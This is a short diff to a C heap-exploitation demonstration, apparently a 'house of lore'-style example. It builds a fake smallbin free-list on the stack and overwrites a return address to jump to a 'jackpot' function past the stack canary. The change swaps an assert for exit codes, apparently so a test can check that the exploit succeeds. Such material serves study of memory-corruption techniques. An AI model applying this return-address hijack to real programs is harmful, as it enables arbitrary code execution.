@@ -77,7 +77,7 @@ int main(int argc, char * argv[]){
   fprintf(stderr, "Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash "
           "introduced by smallbin-to-tcache mechanism\n");
   stack_buffer_2[3] = (intptr_t *)fake_freelist[0];
-  
+
   fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
          "the small one during the free()\n");
   void *p5 = malloc(1000);
@@ -132,5 +132,9 @@ int main(int argc, char * argv[]){
   memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
 
   // sanity check
-  assert((long)__builtin_return_address(0) == (long)jackpot);
+  if ((long)__builtin_return_address(0) == (long)jackpot) {
+    exit(228);
+	} else {
+		exit(227);
+	}
 }
